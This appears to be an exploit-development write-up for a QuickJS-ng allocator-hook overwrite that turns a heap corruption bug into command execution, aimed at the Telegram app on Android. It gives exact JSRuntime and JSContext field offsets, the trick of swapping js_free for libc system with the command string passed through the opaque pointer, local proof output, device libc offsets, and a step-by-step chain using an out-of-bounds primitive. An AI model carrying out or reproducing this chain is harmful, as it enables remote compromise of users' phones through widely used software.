# RCE endgame — JSRuntime allocator-hook overwrite (local proof)

Date: 2026-11-01
Engine: quickjs-ng v0.17.0 (same engine family as the app snapshot)
Status: **endgame proven locally on x86-64**, waiting for the PR #1827
arbitrary read/write primitive to write the two fields.

## Layout

```
JSContext:  JSGCObjectHeader header (16 bytes) ; JSRuntime *rt at +16
JSRuntime:  JSMallocFunctions mf              at +0
            JSMallocState malloc_state        at +40
JSMallocFunctions: calloc +0, malloc +8, free +16, realloc +24, usable +32
JSMallocState:     malloc_count +0, malloc_size +8, malloc_limit +16, opaque +24
```

So:
- `rt->mf.js_free` = `rt + 16`
- `rt->malloc_state.opaque` = `rt + 64`
- `js_free_rt(rt, ptr)` calls `rt->mf.js_free(rt->malloc_state.opaque, ptr)`.

Overwrite `rt->mf.js_free` with libc `system` and `rt->malloc_state.opaque`
with a NUL-terminated command string. Then any `js_free` of a >512 B
allocation calls `system(command)` — the `opaque` argument lands in `rdi`,
exactly what `system` expects.

## Local proof

`lab/endgame_rt.c`:

```
rt=0x55b16e9362a0 mf.js_free=0x55b159740190 opaque=(nil)
patched mf.js_free=0x7fb85a70e090 opaque=0x55b159867240 cmd=touch /tmp/qjs_endgame_pwned
freeing large string...
after free
exit=0
-rw-r--r-- 1 root root 0 /tmp/qjs_endgame_pwned
```

The large string (>512 B) bypasses the small-block arena, reaches
`js_free_rt`, and executes the command through the patched hook.

## Device libc offsets (pulled from the phone)

- libc: `/apex/com.android.runtime/lib64/bionic/libc.so`
  (md5 `44e776da3389c375113928c22b5b9399`, Build ID
  `2938f6235116cbc48464ee0f7622625e`; matches the libc BuildId in the app
  tombstones).
- `system - free = 0x26df0` (159,216)
- `malloc - free = 0x174` (372)
- `system` is a real exported implementation, not a PLT stub.
- The app process's libc base is ASLR-random; the leaked `js_free` pointer
  gives it at runtime: `system = leaked_free + 0x26df0`.

## Remaining step

Use the PR #1827 OOB primitive to obtain arbitrary read/write, leak
`JSContext*` from a C function object's `u.cfunc.realm` (+48), read
`ctx->rt` (+16), read `rt->mf.js_free` (libc `free`), compute `system`,
write `system` to `rt+16`, write the command pointer to `rt+64`, then free
a >512 B allocation. This yields command execution in the Telegram process.
